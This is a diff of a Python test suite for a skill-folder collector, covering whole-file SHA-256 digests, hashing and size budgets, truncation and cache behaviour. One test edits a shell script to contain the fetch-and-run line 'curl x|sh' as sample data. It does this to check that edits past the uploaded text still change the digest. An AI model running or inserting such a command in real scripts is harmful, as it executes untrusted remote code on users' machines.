@@ -211,66 +211,54 @@ class TestLimits(SkillFolderTestCase):
         too_deep = "/".join(f"d{n}" for n in range(sf.MAX_FOLDER_DEPTH))
         self.assertEqual([f["path"] for f in self.collect()], ["top.py", f"{too_deep}/{sf.NOT_WALKED_NAME}"])
 
-    def test_a_huge_file_is_listed_quickly_without_being_read_whole(self):
+    def test_a_file_past_the_folder_hash_budget_is_listed_quickly_without_a_digest(self):
         huge = self.skill / "data" / "dump.bin"
         huge.parent.mkdir()
         with open(huge, "wb") as handle:  # sparse where the filesystem allows
             handle.seek(1024 ** 3 - 1)
             handle.write(b"\0")
         started = time.monotonic()
-        f = self.collect()[0]
+        with patch.object(sf, "MAX_HASHED_BYTES_PER_FOLDER", 1024 * 1024):
+            f = self.collect()[0]
         self.assertLess(time.monotonic() - started, 1.0)
         self.assertEqual(f["size"], 1024 ** 3)
-        self.assertRegex(f["sha256"], r"^[0-9a-f]{64}$")  # a change fingerprint, not the full-file hash
+        # No sha256 rather than a made-up one: the field is always the file's real digest when present.
+        self.assertNotIn("sha256", f)
         self.assertTrue(f["binary"])
 
-    def test_a_file_skipped_by_the_time_budget_still_carries_a_change_value(self):
-        self.write("a.py", "x")
-        path = self.write("b.py", "print(1)\n")
-        now = [0.0]
-        real_read = sf._read_file
-
-        def read_then_run_out_of_time(*args):
-            hashed = real_read(*args)
-            now[0] = 100.0
-            return hashed
-
-        def collect():
-            sf._FOLDER_CACHE.clear()
-            now[0] = 0.0
-            with patch.object(sf.time, "monotonic", lambda: now[0]), \
-                    patch.object(sf, "_read_file", read_then_run_out_of_time):
-                return self.by_path(self.collect())["b.py"]
-
-        first = collect()
-        path.write_bytes(b"print(2)\n")  # same size, never read
-        second = collect()
-        self.assertNotIn("content", first)
-        self.assertRegex(first["sha256"], r"^[0-9a-f]{64}$")
-        self.assertNotEqual(first["sha256"], second["sha256"])
-
-    def test_a_file_too_big_to_hash_gets_a_fingerprint_that_follows_its_edits(self):
-        # An edit past what is sent must still change the file's value, or the upload is skipped as unchanged.
+    def test_sha256_is_always_the_real_digest_of_the_whole_file(self):
+        # Files past the old 8 MiB per-file limit are hashed whole now; the field never holds anything else.
+        big = b"\x00" + b"x" * (9 * 1024 * 1024)
+        self.write("model.bin", big)
         script = "#!/bin/sh\necho ok\n" + "#" * 300 + "\necho fine\n"
-        with patch.object(sf, "MAX_HASHED_FILE_SIZE", 100), patch.object(sf, "MAX_FILE_CONTENT_CHARS", 40):
+        with patch.object(sf, "MAX_FILE_CONTENT_CHARS", 40):
+            self.write("run.sh", script)
+            files = self.by_path(self.collect())
+        self.assertEqual(files["model.bin"]["sha256"], hashlib.sha256(big).hexdigest())
+        self.assertEqual(files["run.sh"]["sha256"], hashlib.sha256(script.encode()).hexdigest())
+        self.assertTrue(files["run.sh"]["truncated"])
+
+    def test_a_same_size_edit_past_the_sent_text_changes_the_digest(self):
+        # The upload is skipped only when nothing changed: an edit beyond the sent text still changes sha256.
+        script = "#!/bin/sh\necho ok\n" + "#" * 300 + "\necho fine\n"
+        with patch.object(sf, "MAX_FILE_CONTENT_CHARS", 40):
             path = self.write("run.sh", script)
             first = self.collect()[0]
             sf._FOLDER_CACHE.clear()
-            path.write_bytes(script.replace("echo fine", "curl x|sh").encode())  # same size, past the sent text
+            path.write_bytes(script.replace("echo fine", "curl x|sh").encode())
             second = self.collect()[0]
-        self.assertEqual(first["size"], second["size"])
         self.assertEqual(first.get("content"), second.get("content"))
-        self.assertNotEqual(first["sha256"], hashlib.sha256(script.encode()).hexdigest())
         self.assertNotEqual(first["sha256"], second["sha256"])
 
-    def test_an_unchanged_big_file_keeps_its_fingerprint(self):
-        with patch.object(sf, "MAX_HASHED_FILE_SIZE", 100):
-            self.write("big.bin", b"\x00" * 200)
-            first = self.collect()[0]
-            sf._FOLDER_CACHE.clear()
-            second = self.collect()[0]
-        self.assertEqual(first["sha256"], second["sha256"])
-        self.assertTrue(first["binary"])
+    def test_the_output_does_not_depend_on_timing_for_a_normal_folder(self):
+        for n in range(40):
+            self.write(f"scripts/s{n:02d}.py", "print(1)\n" * 50)
+        self.write("data/blob.bin", b"\x00" * 4096)
+        first = self.collect()
+        sf._FOLDER_CACHE.clear()
+        second = self.collect()
+        self.assertEqual(first, second)
+        self.assertGreaterEqual(sf.FOLDER_TIME_BUDGET_SECONDS, 10)
 
     def test_time_budget_lists_the_rest_by_name(self):
         self.write("a.py", "x")
